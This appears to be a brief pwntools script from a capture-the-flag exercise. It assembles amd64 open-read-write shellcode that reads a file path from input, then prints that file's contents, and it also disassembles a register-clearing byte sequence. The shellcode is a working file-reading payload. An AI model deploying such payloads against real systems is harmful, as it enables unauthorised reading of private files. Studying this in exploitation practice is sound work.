from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

filename = 0x41414100
flag = 0x41414200

payload = ''
payload += asm(shellcraft.amd64.linux.syscall('SYS_read', 0, filename, 0x100))
payload += asm(shellcraft.amd64.linux.syscall('SYS_open', filename, 0, 0x400))
payload += asm(shellcraft.amd64.linux.syscall('SYS_read', 'rax', flag, 0x400))
payload += asm(shellcraft.amd64.linux.syscall('SYS_write', 1, flag, 0x400))

print payload.encode('hex')


# -------------------)

context.clear(arch='amd64')
print disasm("\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff")
